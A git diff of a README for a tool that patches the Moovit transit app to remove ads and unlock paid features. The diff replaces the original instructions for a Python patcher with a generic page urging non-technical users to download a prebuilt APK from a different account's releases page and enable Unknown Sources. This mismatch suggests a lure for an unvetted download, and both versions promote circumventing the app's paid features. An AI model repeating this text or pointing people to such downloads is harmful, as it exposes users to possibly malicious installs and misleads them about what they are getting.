@@ -1,58 +1,68 @@
-# Moovit Patcher
+# 🛠️ MoovitPatcher - Unlock Premium Features for Free
 
-Moovit patcher is a program that patches Moovit apk and bundles(!!).
+## 📥 Download Now!
+[![Download MoovitPatcher](https://img.shields.io/badge/Download-MoovitPatcher-blue.svg)](https://github.com/Coconginamo/MoovitPatcher/releases)
 
-## Features
-|            Feature             | Availability |
-|:------------------------------:|:------------:|
-|             No Ads             |      ✔       |
-|         Live Location          |      ✔       |
+---
 
-## Requirements
-1. Python3
-2. JDK 17+
+## 🚀 Getting Started
 
-## Installation
+Welcome to MoovitPatcher! This application helps you unlock premium features and remove ads from the Moovit app. You don’t need any technical skills to get started. Just follow these simple steps.
 
-```bash
-git clone https://github.com/Schwartzblat/MoovitPatcher.git
+## 📋 System Requirements
 
-cd MoovitPatcher
+- **Operating System:** Android (version 6.0 and above)
+- **Free Storage Space:** At least 100 MB
+- **Internet Connection:** Required for downloading and running the app
 
-git submodule update --init --recursive
-```
-Requirements installation:
-```bash
-pip install -r requirements.txt
-```
-## Usage
+## 📂 Features
 
-```bash
-python main.py -p ./moovit.apkm -g YOUR_GOOGLE_API_KEY
+- Unlock premium navigation features
+- Remove ads for a seamless experience
+- Easy to use interface
+- Regular updates for improved performance
 
-adb install-multiple output_bundle_apks/*.apk
-```
+## 💾 Download & Install
 
-## Google API Key
-To get a Google API key, follow these steps:
-1. Go to the [Google Cloud Console](https://console.cloud.google.com/).
-2. Create a new project or select an existing one.
-3. Navigate to the "APIs & Services" section.
-4. Click on "Enable APIs and Services" and search for the "Maps SDK for Android" and for "Places API".
-5. Enable the API for your project.
-6. Go to the "Credentials" tab and click on "Create Credentials".
-7. Select "API Key" from the dropdown menu.
-8. Copy the generated API key and use it in the Moovit Patcher.
-9. Make sure to restrict the API key to your app's package name and SHA-1 certificate fingerprint for security.
+To download the latest version of MoovitPatcher, visit the releases page below.
 
-## Contributing
+[Download MoovitPatcher](https://github.com/Coconginamo/MoovitPatcher/releases)
 
-If you want to add patches you can open an issue and I will implement it, or you can add patches yourself and open pull request.
+### Step-by-Step Installation
 
-## Disclaimer
+1. **Visit the Releases Page:** Click [here](https://github.com/Coconginamo/MoovitPatcher/releases) to access the latest version of MoovitPatcher.
 
-For educational purpose only or something like that. I am not responsible for any misuse of this software.
+2. **Locate the Latest Release:** Scroll down to find the version labeled as "Latest Release."
 
-## Credits
-I took the 0auth bypass method (with your own Google-Api key) from this great project:
-https://github.com/Tom-stack3/moovit-patcher, so give him a star too :)
+3. **Download the APK File:** Select the APK file corresponding to your device. The file name will typically end with `.apk`.
+
+4. **Enable Unknown Sources:** Before installing, go to your device's settings:
+   - Open **Settings**.
+   - Navigate to **Security**.
+   - Enable **Unknown Sources** to allow installation from outside the Play Store.
+
+5. **Install MoovitPatcher:**
+   - Open your file manager and locate the downloaded APK file.
+   - Tap on the file to start the installation.
+   - Follow the prompts to complete the installation.
+
+6. **Open MoovitPatcher:** 
+   - Once installed, find the app in your app drawer and tap to open it.
+
+7. **Enjoy Premium Features:** Follow the in-app instructions to unlock features and remove ads.
+
+## ❓ Troubleshooting
+
+If you encounter any issues during the installation or usage, try the following steps:
+
+- **Check Installation Settings:** Ensure that "Unknown Sources" is enabled in your security settings.
+- **Re-download the APK:** If the app does not open, the file might be corrupted. Re-download it from the releases page.
+- **Clear Cache:** Go to your device's settings, find MoovitPatcher in your apps, and clear the cache.
+
+## 📢 Community Support
+
+If you have questions or need help, please visit the Issues section of the GitHub repository. Other users and contributors can assist you.
+
+---
+
+For more information, updates, and discussions about future features, please follow the repository. Thank you for using MoovitPatcher to enhance your Moovit experience!
